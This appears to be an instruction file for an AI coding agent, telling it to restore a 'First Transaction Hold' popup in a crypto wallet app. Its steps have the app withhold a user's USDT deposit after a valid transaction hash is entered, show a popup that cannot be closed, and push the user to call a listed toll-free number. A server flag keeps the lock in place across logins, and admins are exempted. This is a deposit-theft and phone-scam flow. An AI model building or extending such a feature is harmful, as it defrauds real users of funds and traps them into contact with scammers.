---
name: popup
description: >-
  Restores the saved First Transaction Hold popup after Verify & Credit Deposit,
  same UI and same flow. Use when the user says popup, popup setup, wo popup,
  FirstTransactionHold, verify hold popup, or to re-attach the call-hold popup.
---

# Restore First Transaction Hold popup

Mount the saved popup from `src/popups/FirstTransactionHold/VerifyHoldPopup.tsx`. Do not redesign it. Match this flow exactly.

## Behavior (must match)

- After a valid amount (min 11 USDT) and valid 64-char TxHash, **Verify & Credit Deposit** must **not** credit the wallet.
- Show the saved popup immediately. No ✕, no backdrop close, no Esc.
- Clicking Call Now opens the dialer with **+1-866-557-3615** (`tel:+18665573615`).
- Lock `firstTransactionHold` on that user profile on the server.
- Reload, logout, or login in another browser still shows this popup for that user only.
- New users and users who never reached this click keep the normal credit flow.

## Wire-up

1. Import and render `VerifyHoldPopup` from `src/popups/FirstTransactionHold/VerifyHoldPopup.tsx` at the App dashboard root when `authUser.role !== 'admin'` and (`verifyHoldLocked` or `currentUserAccount.firstTransactionHold`).
2. `ConnectedUser` gets `firstTransactionHold?: boolean`. Persist it on signup as `false`.
3. Add `POST /api/wallet/lock-first-hold` with `{ userId, amount, txHash }`. Same validation as receive (min 11, valid hash). Set `firstTransactionHold: true`. Do **not** credit. Return `userAccount` + `users`.
4. `SendReceiveModal`: after validation, call `onLockFirstHold(amount, txHash)` instead of `onConfirmReceive`. Block modal close while locked.
5. App: `handleLockFirstHold` sets local lock then POSTs the endpoint. Session may cache the flag. Login/`/api/user/details` must restore it.
6. Keep `.call-shake` in `src/index.css` (already present).

Login session persistence (reload stays on dashboard) is unrelated — do not remove it.
